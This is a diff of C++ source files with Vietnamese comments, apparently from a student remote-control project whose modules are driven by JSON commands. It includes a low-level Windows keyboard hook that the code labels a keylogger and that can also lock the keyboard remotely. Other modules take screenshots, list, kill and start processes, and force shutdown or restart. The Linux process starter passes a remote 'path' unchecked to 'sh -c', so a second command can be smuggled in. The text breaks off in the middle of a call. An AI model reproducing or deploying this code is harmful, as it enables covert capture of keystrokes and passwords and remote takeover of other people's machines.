+        0,
+        keyboardLayout
+    );
+
+    // 4. Nếu chuyển đổi thành công -> Chuyển sang UTF-8 string
+    if (result > 0) {
+        std::wstring ws(buffer);
+        int size_needed = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), NULL, 0, NULL, NULL);
+        std::string strTo(size_needed, 0);
+        WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), &strTo[0], size_needed, NULL, NULL);
+        return strTo;
+    }
+
+    return "";
+}
+
+// --- HOOK PROCEDURE (CẬP NHẬT: CHẶN TOÀN DIỆN) ---
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    // Chỉ xử lý khi nCode >= 0 (theo tài liệu MS)
+    if (nCode >= 0) {
+        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
+        DWORD vk = pKeyBoard->vkCode;
+
+        // 1. NẾU ĐANG Ở TRẠNG THÁI KHÓA
+        if (g_isLocked) {
+            // Kiểm tra xem có phải tổ hợp cứu hộ: CTRL + ALT + U không?
+            // (Kiểm tra trạng thái bất đồng bộ của phím vật lý)
+            bool isCtrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
+            bool isAlt  = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
+
+            // Chỉ check unlock khi có sự kiện nhấn phím (WM_KEYDOWN hoặc WM_SYSKEYDOWN)
+            if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+                 if (isCtrl && isAlt && (vk == 'U' || vk == 'u')) {
+                    g_isLocked = false;
+                    std::cout << "[KEYBOARD] EMERGENCY UNLOCK TRIGGERED!\n";
+                    return 1; // Nuốt phím U để không gõ ra màn hình
+                }
+            }
+
+            // CHẶN TẤT CẢ: Bao gồm KeyDown, KeyUp, SysKeyDown (Alt), SysKeyUp
+            // Trả về 1 để Windows không xử lý phím này nữa.
+            return 1; 
+        }
+
+        // 2. NẾU KHÔNG KHÓA -> CHẠY KEYLOGGER
+        // Chỉ log khi nhấn xuống (WM_KEYDOWN) để tránh log kép
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+            std::string keyChar = ConvertVKCodeToString(vk);
+            if (!keyChar.empty() && g_callback) {
+                g_callback(keyChar);
+            }
+        }
+    }
+    
+    // Chuyển tiếp cho ứng dụng khác nếu không chặn
+    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
+}
+// --- CÁC HÀM CỦA CLASS ---
+
+void KeyManager::set_callback(KeyCallback cb) {
+    g_callback = cb;
+}
+
+// [MỚI] Hàm set trạng thái từ Command
+void KeyManager::set_locked(bool locked) {
+    g_isLocked = locked;
+    std::cout << "[KEYBOARD] Lock state: " << (locked ? "LOCKED" : "UNLOCKED") << std::endl;
+}
+
+void KeyManager::start_hook() {
+    if (g_hHook != NULL) return;
+    hookThread = std::thread([]() {
+        g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+        MSG msg;
+        while (GetMessage(&msg, NULL, 0, 0)) {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+        UnhookWindowsHookEx(g_hHook);
+        g_hHook = NULL;
+    });
+    hookThread.detach();
+}
+
+void KeyManager::stop_hook() {
+    if (g_hHook) {
+        // Gửi message WM_QUIT tới thread hook nếu cần thiết, 
+        // hoặc đơn giản là Unhook (tuy nhiên Unhook từ thread khác có thể ko an toàn tuyệt đối nhưng dùng tạm cho đồ án ok)
+        UnhookWindowsHookEx(g_hHook);
+        g_hHook = NULL;
+        g_isLocked = false; // Reset trạng thái khi stop
+    }
+}
+
+json KeyManager::handle_command(const json& request) {
+    std::string command = request.value("command", "");
+    
+    if (command == "START") {
+        start_hook();
+        return {{"status", "success"}, {"message", "Keylogger started"}};
+    }
+    if (command == "STOP") {
+        stop_hook();
+        return {{"status", "success"}, {"message", "Keylogger stopped"}};
+    }
+    // [MỚI] LỆNH LOCK / UNLOCK
+    if (command == "LOCK") {
+        // Phải đảm bảo Hook đã chạy thì mới Lock được
+        if (g_hHook == NULL) start_hook(); 
+        set_locked(true);
+        return {{"status", "success"}, {"message", "Keyboard LOCKED. Press Ctrl+Alt+U to unlock locally."}};
+    }
+    if (command == "UNLOCK") {
+        set_locked(false);
+        return {{"status", "success"}, {"message", "Keyboard UNLOCKED"}};
+    }
+
+    return {{"status", "error"}, {"message", "Unknown command"}};
+}
+--
+// KeyManager.hpp
+#pragma once
+#include <string>
+#include <functional>
+#include <thread>
+#include <nlohmann/json.hpp>
+#include "../interfaces/IRemoteModule.hpp"
+
+#if _WIN32
+#include <windows.h>
+#else
+#include <map>
+#include <fstream>
+#include <atomic>
+#include <fcntl.h>      // open
+#include <unistd.h>     // close, read
+#include <linux/input.h>// struct input_event, KEY_*
+#include <dirent.h>     // scandir
+#include <cstring>
+#endif
+
+using json = nlohmann::json;
+using KeyCallback = std::function<void(std::string key_char)>;
+
+class KeyManager : public IRemoteModule {
+public:
+    static void set_callback(KeyCallback cb);
+    void start_hook();
+    void stop_hook();
+    
+    // [MỚI] Hàm set trạng thái khóa
+    static void set_locked(bool locked);
+
+    const std::string& get_module_name() const override { 
+        static const std::string name = "KEYBOARD"; 
+        return name; 
+    }
+
+    json handle_command(const json& request) override;
+
+private:
+    std::thread hookThread;
+};
+
+--
+#include "ProcessManager.hpp"
+
+const std::string& ProcessManager::get_module_name() const {
+    static const std::string name = "PROCESS";
+    return name;
+}
+
+json ProcessManager::handle_command(const json& request) {
+    std::string cmd = request.value("command", "");
+
+    // --- 1. LIST ---
+    if (cmd == "LIST") {
+        return list_processes();
+    }
+    
+    // --- 2. KILL ---
+    else if (cmd == "KILL") {
+        int pid = 0;
+        if (request.contains("payload") && request["payload"].contains("pid")) {
+            pid = request["payload"]["pid"].get<int>();
+        } else if (request.contains("pid")) {
+            pid = request.value("pid", 0);
+        }
+
+        if (pid > 0 && kill_process(pid)) {
+            return {
+                {"status", "success"},
+                {"module", get_module_name()},
+                {"command", "KILL"},
+                {"pid", pid},
+                {"data", "Process terminated"}
+            };
+        } else {
+            return {
+                {"status", "error"}, 
+                {"module", get_module_name()},
+                {"error", "Failed to kill process"}};
+        }
+    }
+
+    // --- 3. START (MỚI) ---
+    else if (cmd == "START") {
+        std::string path;
+        // Lấy đường dẫn từ payload
+        if (request.contains("payload") && request["payload"].contains("path")) {
+            path = request["payload"]["path"].get<std::string>();
+        } 
+        // Fallback
+        else if (request.contains("path")) {
+            path = request.value("path", "");
+        }
+
+        if (path.empty()) {
+            return {
+                {"status", "error"}, 
+                {"module", get_module_name()},
+                {"error", "Missing 'path' in payload"}};
+        }
+
+        int new_pid = 0;
+        if (start_process(path, new_pid)) {
+            return {
+                {"status", "success"},
+                {"module", "PROCESS"},
+                {"command", "START"},
+                {"pid", new_pid},
+                {"data", "Process started successfully"}
+            };
+        } else {
+            return {
+                {"status", "error"}, 
+                {"module", get_module_name()},
+                {"error", "Failed to create process. Check path."}
+            };
+        }
+    }
+
+    return {
+        {"status", "error"}, 
+        {"module", get_module_name()},
+        {"error", "Unknown command"}
+    };
+}
+
+json ProcessManager::list_processes() {
+    json process_list = json::array();
+
+    DIR* proc_dir = opendir("/proc");
+    if (!proc_dir) {
+        return {
+            {"status", "error"},
+            {"module", get_module_name()},
+            {"command", "LIST"},
+            {"message", "Could not open /proc directory"}
+        };
+    }
+
+    struct dirent* entry;
+    while ((entry = readdir(proc_dir)) != NULL) {
+        
+        if (entry->d_type != DT_DIR) {
+            continue;
+        }
+
+        const char* d_name = entry->d_name;
+        bool is_pid = true;
+        if (*d_name == '\0') is_pid = false; // Tên rỗng
+
+        while (*d_name) {
+            if (!std::isdigit(*d_name)) {
+                is_pid = false;
+                break;
+            }
+            d_name++;
+        }
+
+        if (is_pid) {
+            std::string pid_str(entry->d_name);
+            unsigned long pid = 0;
+            unsigned long threads = 0;
+            std::string name;
+
+            try {
+                pid = std::stoul(pid_str);
+            } catch (...) {
+                continue; // Bỏ qua nếu không phải số hợp lệ
+            }
+
+            std::ifstream comm_file("/proc/" + pid_str + "/comm");
+            if (comm_file.is_open()) {
+                std::getline(comm_file, name);
+            } else {
+                continue; 
+            }
+
+            std::ifstream status_file("/proc/" + pid_str + "/status");
+            std::string line;
+            if (status_file.is_open()) {
+                while (std::getline(status_file, line)) {
+                    if (line.rfind("Threads:", 0) == 0) {
+                        std::stringstream ss(line);
+                        std::string key; // Đọc chữ "Threads:"
+                        ss >> key >> threads; // Đọc số lượng luồng
+                        break;
+                    }
+                }
+            }
+            process_list.push_back({
+                {"pid",     pid},
+                {"name",    name}, 
+                {"threads", threads}
+            });
+        }
+    }
+
+    closedir(proc_dir);
+
+    return {
+        {"status", "success"},
+        {"module", get_module_name()}, 
+        {"command", "LIST"},
+        {"data", process_list}
+    };
+}
+
+bool ProcessManager::start_process(const std::string& path, int& out_pid) {
+    int pipe_fd[2];
+    if (pipe(pipe_fd) == -1) 
+        return false;
+
+    pid_t pid = fork();
+
+    if (pid == -1) {
+        close(pipe_fd[0]);
+        close(pipe_fd[1]);
+        return false;
+    }
+
+    if (pid == 0) {
+        // --- TIẾN TRÌNH CON ---
+        
+        // 1. Chuyển stdout sang đầu 'write' của pipe
+        close(pipe_fd[0]); // Con không đọc, đóng đầu đọc
+        dup2(pipe_fd[1], STDOUT_FILENO); // Chuyển hướng stdout
+        close(pipe_fd[1]); // Đóng fd gốc
+
+        // 2. Chạy lệnh wrapper
+        // Ví dụ: "alacritty & echo $!"
+        std::string command = path + " & echo $!";
+        
+        execl("/bin/sh", "sh", "-c", command.c_str(), (char*) NULL);
+        
+        // Nếu execl thất bại
+        _exit(errno); 
+    }
+
+    // --- TIẾN TRÌNH CHA ---
+    close(pipe_fd[1]); // Cha không viết, đóng đầu viết
+
+    int status;
+    waitpid(pid, &status, 0); 
+
+    std::array<char, 32> buffer;
+    std::string real_pid_str;
+    ssize_t bytes_read = read(pipe_fd[0], buffer.data(), buffer.size() - 1);
+    
+    close(pipe_fd[0]); // Đọc xong, đóng đầu đọc
+
+    unsigned long real_pid = 0;
+
+    if (bytes_read > 0) {
+        buffer[bytes_read] = '\0'; // Đảm bảo kết thúc chuỗi
+        real_pid_str = buffer.data();
+        
+        // Xóa ký tự newline '\n' ở cuối
+        real_pid_str.erase(
+            std::remove(real_pid_str.begin(), real_pid_str.end(), '\n'), 
+            real_pid_str.end()
+        );
+
+        try {
+            real_pid = std::stoul(real_pid_str);
+        } catch (...) {
+             return false; 
+        }
+    } else {
+         return false;
+    }
+
+    out_pid = real_pid;
+    return true;
+}
+
+bool ProcessManager::kill_process(int pid_ul) {
+    pid_t pid = static_cast<pid_t>(pid_ul);
+
+    const pid_t self = getpid();
+    if (pid == self) {
+        return false;
+    }
+
+    // if (kill(pid, 0) == -1) {
+    //     return false;
+    // }
+
+    if (kill(pid, SIGKILL) == 0) {
+        return true;
+    }
+
+    return false;
+}    
+     
+     
+     
+     
+
+--
+#include "ProcessManager.hpp"
+#include <iostream>
+
+const std::string& ProcessManager::get_module_name() const {
+    static const std::string name = "PROCESS";
+    return name;
+}
+
+json ProcessManager::handle_command(const json& request) {
+    std::string cmd = request.value("command", "");
+
+    // --- 1. LIST ---
+    if (cmd == "LIST") {
+        return list_processes();
+    }
+    
+    // --- 2. KILL ---
+    else if (cmd == "KILL") {
+        int pid = 0;
+        if (request.contains("payload") && request["payload"].contains("pid")) {
+            pid = request["payload"]["pid"].get<int>();
+        } else if (request.contains("pid")) {
+            pid = request.value("pid", 0);
+        }
+
+        if (pid > 0 && kill_process(pid)) {
+            return {
+                {"module", "PROCESS"},
+                {"command", "KILL"},
+                {"status", "success"},
+                {"pid", pid},
+                {"message", "Process terminated"}
+            };
+        } else {
+            return {{"status", "error"}, {"message", "Failed to kill process"}};
+        }
+    }
+
+    // --- 3. START (MỚI) ---
+    else if (cmd == "START") {
+        std::string path;
+        // Lấy đường dẫn từ payload
+        if (request.contains("payload") && request["payload"].contains("path")) {
+            path = request["payload"]["path"].get<std::string>();
+        } 
+        // Fallback
+        else if (request.contains("path")) {
+            path = request.value("path", "");
+        }
+
+        if (path.empty()) {
+            return {{"status", "error"}, {"message", "Missing 'path' in payload"}};
+        }
+
+        int new_pid = 0;
+        if (start_process(path, new_pid)) {
+            return {
+                {"module", "PROCESS"},
+                {"command", "START"},
+                {"status", "success"},
+                {"pid", new_pid},
+                {"message", "Process started successfully"}
+            };
+        } else {
+            return {{"status", "error"}, {"message", "Failed to create process. Check path."}};
+        }
+    }
+
+    return {{"status", "error"}, {"message", "Unknown command"}};
+}
+
+// ... (Hàm list_processes giữ nguyên) ...
+json ProcessManager::list_processes() {
+    json process_list = json::array();
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return {{"status", "error"}};
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(hSnapshot, &pe32)) {
+        do {
+            process_list.push_back({
+                {"pid", (int)pe32.th32ProcessID},
+                {"name", std::string(pe32.szExeFile)},
+                {"threads", (int)pe32.cntThreads}
+            });
+        } while (Process32Next(hSnapshot, &pe32));
+    }
+    CloseHandle(hSnapshot);
+    return {{"module", "PROCESS"}, {"command", "LIST"}, {"status", "success"}, {"data", {{"process_list", process_list}}}};
+}
+
+// ... (Hàm kill_process giữ nguyên) ...
+bool ProcessManager::kill_process(int pid) {
+    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (!hProcess) return false;
+    bool res = TerminateProcess(hProcess, 1);
+    CloseHandle(hProcess);
+    return res;
+}
+
+// [MỚI] Cài đặt hàm Start Process
+bool ProcessManager::start_process(const std::string& path, int& out_pid) {
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // CreateProcess yêu cầu chuỗi command line có thể ghi được (mutable), nên ta copy ra buffer
+    std::vector<char> cmdData(path.begin(), path.end());
+    cmdData.push_back('\0');
+
+    // API tạo tiến trình
+    if (CreateProcessA(
+        NULL,           // No module name (use command line)
+        cmdData.data(), // Command line
+        NULL,           // Process handle not inheritable
+        NULL,           // Thread handle not inheritable
+        FALSE,          // Set handle inheritance to FALSE
+        0,              // No creation flags
+        NULL,           // Use parent's environment block
+        NULL,           // Use parent's starting directory 
+        &si,            // Pointer to STARTUPINFO structure
+        &pi             // Pointer to PROCESS_INFORMATION structure
+    )) {
+        out_pid = (int)pi.dwProcessId;
+        
+        // Quan trọng: Đóng handle để tránh rò rỉ bộ nhớ (Process vẫn chạy bình thường)
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return true;
+    }
+    
+    return false;
+}
+
+--
+#pragma once
+#include "../interfaces/IRemoteModule.hpp"
+#include <string>
+#include <iostream>
+#include <nlohmann/json.hpp>
+#include <fstream>
+
+#if _WIN32
+#include <windows.h>
+#include <tlhelp32.h>
+#else
+#include <signal.h>
+#include <wait.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <cstdlib>
+#include <dirent.h>
+#endif
+
+using json = nlohmann::json;
+
+class ProcessManager : public IRemoteModule {
+public:
+    const std::string& get_module_name() const override;
+    json handle_command(const json& request) override;
+
+private:
+    json list_processes();
+    bool kill_process(int pid);
+    
+    // [MỚI] Hàm khởi tạo tiến trình trả về PID
+    bool start_process(const std::string& path, int& out_pid);
+};
+
+--
+#include "ScreenManager.hpp"
+
+json ScreenManager::handle_command(const json& request) {
+    // Chúng ta sẽ xử lý capture binary ở main.cpp để truy cập socket trực tiếp
+    // Hàm này chỉ trả về OK để báo hiệu nếu cần.
+    return { {"status", "ok"} };
+}
+
+bool ScreenManager::capture_screen_data(std::vector<uint8_t>& out_buffer, std::string& error_msg) {
+    error_msg.clear();
+
+    // 1. Kết nối với X Server
+    Display* display = XOpenDisplay(NULL);
+    if (!display) {
+        error_msg = "Cannot open X Display";
+        return false;
+    }
+
+    Window root = DefaultRootWindow(display);
+    
+    // Lấy thông số màn hình
+    XWindowAttributes attributes;
+    XGetWindowAttributes(display, root, &attributes);
+    int width = attributes.width;
+    int height = attributes.height;
+
+    // 2. Chụp màn hình
+    XImage* img = XGetImage(display, root, 0, 0, width, height, AllPlanes, ZPixmap);
+    if (!img) {
+        error_msg = "XGetImage failed";
+        XCloseDisplay(display);
+        return false;
+    }
+
+    // 3. Chuẩn bị dữ liệu RGB để nén
+    // X11 thường trả về BGRA, libjpeg cần RGB. Ta phải convert thủ công.
+    std::vector<uint8_t> rgb_data;
+    rgb_data.resize(width * height * 3);
+
+    for (int y = 0; y < height; y++) {
+        for (int x = 0; x < width; x++) {
+            unsigned long pixel = XGetPixel(img, x, y);
+            
+            // Tách màu dựa trên Mask của XImage (để an toàn với mọi loại màn hình)
+            uint8_t r = (pixel & img->red_mask) >> 16;  // Thường shift 16
+            uint8_t g = (pixel & img->green_mask) >> 8; // Thường shift 8
+            uint8_t b = (pixel & img->blue_mask);       // Thường shift 0
+            
+            // Nếu mask không đúng chuẩn (ví dụ màn hình BGR), code trên cần chỉnh lại shift
+            
+            int index = (y * width + x) * 3;
+            rgb_data[index] = r;
+            rgb_data[index + 1] = g;
+            rgb_data[index + 2] = b;
+        }
+    }
+
+    // 4. Nén sang JPEG bằng libjpeg
+    struct jpeg_compress_struct cinfo;
+    struct jpeg_error_mgr jerr;
+
+    cinfo.err = jpeg_std_error(&jerr);
+    jpeg_create_compress(&cinfo);
+
+    // Cấu hình output vào bộ nhớ (Memory Buffer) thay vì File
+    // out_buffer sẽ tự động được resize bởi libjpeg
+    unsigned char* mem_buffer = NULL;
+    unsigned long mem_size = 0;
+    jpeg_mem_dest(&cinfo, &mem_buffer, &mem_size); 
+
+    // Cấu hình thông số ảnh
+    cinfo.image_width = width;
+    cinfo.image_height = height;
+    cinfo.input_components = 3; // RGB
+    cinfo.in_color_space = JCS_RGB;
+
+    jpeg_set_defaults(&cinfo);
+    
+    // Đặt chất lượng nén (Quality = 60)
+    jpeg_set_quality(&cinfo, 60, TRUE);
+
+    // Bắt đầu nén
+    jpeg_start_compress(&cinfo, TRUE);
+
+    int row_stride = width * 3;
+    while (cinfo.next_scanline < cinfo.image_height) {
+        // Ghi từng dòng
+        JSAMPROW row_pointer[1];
+        row_pointer[0] = &rgb_data[cinfo.next_scanline * row_stride];
+        jpeg_write_scanlines(&cinfo, row_pointer, 1);
+    }
+
+    jpeg_finish_compress(&cinfo);
+    
+    // 5. Copy dữ liệu từ buffer của libjpeg sang vector output
+    out_buffer.assign(mem_buffer, mem_buffer + mem_size);
+
+    // --- Lưu file JPEG ra ổ đĩa ---
+    FILE* fp = fopen("screenshot.jpg", "wb");
+    if (fp) {
+        fwrite(out_buffer.data(), 1, out_buffer.size(), fp);
+        fclose(fp);
+    } else {
+        error_msg = "Cannot write screenshot.jpg";
+        // Bạn có thể return false tùy nhu cầu
+    }
+
+    // Dọn dẹp libjpeg
+    if (mem_buffer) free(mem_buffer); // jpeg_mem_dest cấp phát bằng malloc
+    jpeg_destroy_compress(&cinfo);
+
+    // Dọn dẹp X11
+    XDestroyImage(img); // Hàm này tự free memory của img
+    XCloseDisplay(display);
+
+    return true;
+}
+
+--
+#include "ScreenManager.hpp"
+
+// [FIX] Thêm thư viện này để định nghĩa IStream cho GDI+
+// Bắt buộc phải có nếu dự án dùng WIN32_LEAN_AND_MEAN
+
+#include <gdiplus.h>
+#include <vector>
+#include <memory>
+#include <iostream>
+#include <fstream>
+#include <ctime>
+#include <iomanip>
+#include <sstream>
+#include <direct.h> // Để tạo thư mục (_mkdir)
+// Link thư viện GDI+ (Chỉ hoạt động với MSVC, nếu dùng MinGW cần thêm trong CMakeLists.txt)
+#pragma comment (lib,"Gdiplus.lib")
+
+using namespace Gdiplus;
+
+// Helper để lấy Encoder ID cho JPEG
+static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT  num = 0; UINT  size = 0;
+    GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+    auto pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL) return -1;
+    GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+    free(pImageCodecInfo);
+    return -1;
+}
+// Hàm khởi tạo/hủy GDI+ (Singleton đơn giản)
+struct GdiPlusInit {
+    ULONG_PTR gdiplusToken;
+    GdiPlusInit() { GdiplusStartupInput g; GdiplusStartup(&gdiplusToken, &g, NULL); }
+    ~GdiPlusInit() { GdiplusShutdown(gdiplusToken); }
+};
+static GdiPlusInit init;
+
+static void SaveDataToDisk(const std::vector<uint8_t>& data, const std::string& prefix) {
+    // 1. Tạo thư mục logs nếu chưa có
+    _mkdir("captured_data");
+    
+    // 2. Tạo tên file theo thời gian: captured_data/screen_20231208_103001.jpg
+    auto t = std::time(nullptr);
+    auto tm = *std::localtime(&t);
+    
+    std::ostringstream oss;
+    oss << "captured_data/" << prefix << "_" 
+        << std::put_time(&tm, "%Y%m%d_%H%M%S") << ".jpg";
+    
+    std::string filename = oss.str();
+
+    // 3. Ghi file
+    std::ofstream file(filename, std::ios::binary);
+    if (file.is_open()) {
+        file.write(reinterpret_cast<const char*>(data.data()), data.size());
+        file.close();
+        std::cout << "[STORAGE] Saved: " << filename << std::endl;
+    }
+}
+
+// === CAPTURE SCREEN TO JPEG BUFFER ===
+// === CAPTURE SCREEN ===
+bool ScreenManager::capture_screen_data(std::vector<uint8_t>& out_buffer, std::string& error_msg, bool save_to_disk) {
+    error_msg.clear();
+    int width = GetSystemMetrics(SM_CXSCREEN);
+    int height = GetSystemMetrics(SM_CYSCREEN);
+
+    HDC hScreenDC = GetDC(NULL);
+    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+    HGDIOBJ hOldBitmap = SelectObject(hMemoryDC, hBitmap);
+
+    if (!BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY)) {
+        error_msg = "BitBlt failed";
+        return false;
+    }
+
+    Bitmap* bitmap = Bitmap::FromHBITMAP(hBitmap, NULL);
+    IStream* stream = NULL;
+    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) {
+        delete bitmap; return false;
+    }
+
+    CLSID jpgClsid;
+    GetEncoderClsid(L"image/jpeg", &jpgClsid);
+    EncoderParameters encoderParameters;
+    encoderParameters.Count = 1;
+    encoderParameters.Parameter[0].Guid = EncoderQuality;
+    encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
+    encoderParameters.Parameter[0].NumberOfValues = 1;
+    ULONG quality = 60; 
+    encoderParameters.Parameter[0].Value = &quality;
+
+    Status stat = bitmap->Save(stream, &jpgClsid, &encoderParameters);
+    
+    if (stat == Ok) {
+        STATSTG stg;
+        stream->Stat(&stg, STATFLAG_NONAME);
+        ULONG streamSize = stg.cbSize.LowPart;
+        out_buffer.resize(streamSize);
+        LARGE_INTEGER seekPos; seekPos.QuadPart = 0;
+        stream->Seek(seekPos, STREAM_SEEK_SET, NULL);
+        ULONG bytesRead;
+        stream->Read(out_buffer.data(), streamSize, &bytesRead);
+
+        if (save_to_disk) { // Chỉ lưu khi biến này true
+            SaveDataToDisk(out_buffer, "screen");
+        }
+    } else {
+        error_msg = "GDI+ Save Failed";
+    }
+
+    stream->Release();
+    delete bitmap;
+    SelectObject(hMemoryDC, hOldBitmap);
+    DeleteObject(hBitmap);
+    DeleteDC(hMemoryDC);
+    ReleaseDC(NULL, hScreenDC);
+
+    return (stat == Ok);
+}
+
+json ScreenManager::handle_command(const json& request) {
+    return { {"status", "ok"} };
+}
+--
+#pragma once
+#include "../interfaces/IRemoteModule.hpp"
+#include <vector>
+#include <string>
+
+// --- CẤU HÌNH CHO WINDOWS ---
+#if defined(_WIN32)
+    #include <windows.h>
+    #include <objidl.h> 
+    #include <gdiplus.h> // Thường cần thêm cái này cho chụp ảnh màn hình Windows
+
+// --- CẤU HÌNH CHO LINUX ---
+#elif defined(__linux__)
+    #include <X11/Xlib.h>
+    #include <X11/Xutil.h>
+    #include <jpeglib.h>
+    #include <iostream>
+    #include <cstring>
+#endif
+class ScreenManager : public IRemoteModule {
+public:
+    const std::string& get_module_name() const override { 
+        static const std::string name = "SCREEN"; return name; 
+    }
+    
+    json handle_command(const json& request) override;
+
+    // Hàm public để Main gọi trực tiếp
+    //static bool capture_screen_data(std::vector<uint8_t>& out_buffer, std::string& error_msg);
+    static bool capture_screen_data(std::vector<uint8_t>& out_buffer, std::string& error_msg, bool save_to_disk = true); // Mặc định là lưu vào ổ đĩa, còn khi streaming thì không lưu
+};
+
+--
+#include "SystemManager.hpp"
+
+void wrapper_shutdown() {
+    std::this_thread::sleep_for(std::chrono::seconds(5));
+    int t = system("nohup systemctl poweroff");
+}
+
+void wrapper_restart() {
+    std::this_thread::sleep_for(std::chrono::seconds(5));
+    int t = system("nohup systemctl reboot");
+}
+
+json SystemManager::shutdown_system() const {
+    int can_shutdown = system("systemctl --dry-run poweroff > /dev/null 2>&1");
+    json res = {
+        {"status", "success"},
+        {"module", get_module_name()},
+        {"command", "SHUTDOWN"}
+    };
+
+    if (can_shutdown != 0) { // can't shutdown
+        res["status"] = "error";
+        res["error"] = "Can't shutdown";
+
+        return res;
+    }
+
+    res["data"] = "Shutdown successfully";
+
+    std::thread t(wrapper_shutdown);
+    t.detach();
+
+    return res;
+}
+
+json SystemManager::restart_system() const {
+    int can_restart = system("systemctl --dry-run reboot > /dev/null 2>&1");
+    json res = {
+        {"status", "success"},
+        {"module", get_module_name()},
+        {"command", "RESTART"}
+    };
+
+    if (can_restart != 0) { // can't shutdown
+        res["status"] = "error";
+        res["error"] = "Can't restart";
+
+        return res;
+    }
+
+    res["data"] = "Restart successfully";
+
+    std::thread t(wrapper_restart);
+    t.detach();
+
+    return res;
+
+}
+
+json SystemManager::handle_command(const json& request) {
+    const std::string command = request.value("command", "");
+
+    if (command == "SHUTDOWN") {
+        return shutdown_system();
+    }
+
+    else if (command == "RESTART")
+        return restart_system();
+    
+    return {
+        {"status", "error"},
+        {"module", get_module_name()},
+        {"error", "Unknown system command"}
+    };
+}
+
+--
+#include "SystemManager.hpp"
+
+// Shutdown system
+json SystemManager::shutdown_system() const {
+    // Yeu cau tat may
+    HANDLE hToken = nullptr; // Handle cho token, co tac dung cap quyen
+    TOKEN_PRIVILEGES tkp{}; // Chua thong tin ve quyen 
+
+    // Mo token cua quy trinh hien tai
+    if (!OpenProcessToken(GetCurrentProcess(), 
+                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
+                          &hToken)) 
+    {
+        return {
+            {"status","error"},
+            {"module", get_module_name()},
+            {"message","OpenProcessToken failed"},
+            {"last_error", static_cast<int>(GetLastError())}
+        };
+    }
+
+    // Lay quyen shutdown
+    LookupPrivilegeValue(nullptr, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
+    tkp.PrivilegeCount = 1; // Mot quyen
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, nullptr, nullptr);
+
+    // Thuc hien shutdown
+    const BOOL res = ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE,
+                                    SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);       
+                                    const DWORD gle = res ? 0 : GetLastError();
+                                    CloseHandle(hToken);
+    if (!res) {
+        return {
+        {"status","error"},
+        {"module", get_module_name()},
+        {"message","ExitWindowsEx failed"},
+        {"last_error", static_cast<int>(gle)}
+        };
+    }
+
+    return {
+        {"status","success"},
+        {"module", get_module_name()},
+        {"command","SHUTDOWN"},
+        {"message", "System is shutting down"}
+    };           
+}
+
+// Restart system
+
+json SystemManager::restart_system() const {
+    HANDLE hToken = nullptr;
+    TOKEN_PRIVILEGES tkp{};
+
+    // 1. Mở token của process
+    if (!OpenProcessToken(GetCurrentProcess(),
+                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+                          &hToken))
+    {
+        return {
+            {"status","error"},
+            {"module", get_module_name()},
+            {"message","OpenProcessToken failed"},
+            {"last_error", static_cast<int>(GetLastError())}
+        };
+    }
+
+    // 2. Lấy quyền shutdown
+    if (!LookupPrivilegeValue(nullptr, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
+        DWORD gle = GetLastError();
+        CloseHandle(hToken);
+        return {
+            {"status","error"},
+            {"module", get_module_name()},
+            {"message","LookupPrivilegeValue failed"},
+            {"last_error", static_cast<int>(gle)}
+        };
+    }
+
+    tkp.PrivilegeCount = 1;
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    // 3. Gán quyền vào token
+    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, nullptr, nullptr);
+    DWORD adjustGLE = GetLastError();
+
+    if (adjustGLE == ERROR_NOT_ALL_ASSIGNED) {
+        CloseHandle(hToken);
+        return {
+            {"status","error"},
+            {"module", get_module_name()},
+            {"message","Privilege SE_SHUTDOWN_NAME not assigned"},
+            {"last_error", static_cast<int>(adjustGLE)}
+        };
+    }
+
+    // 4. Thực hiện restart
+    const BOOL res = ExitWindowsEx(
+        EWX_REBOOT | EWX_FORCE,
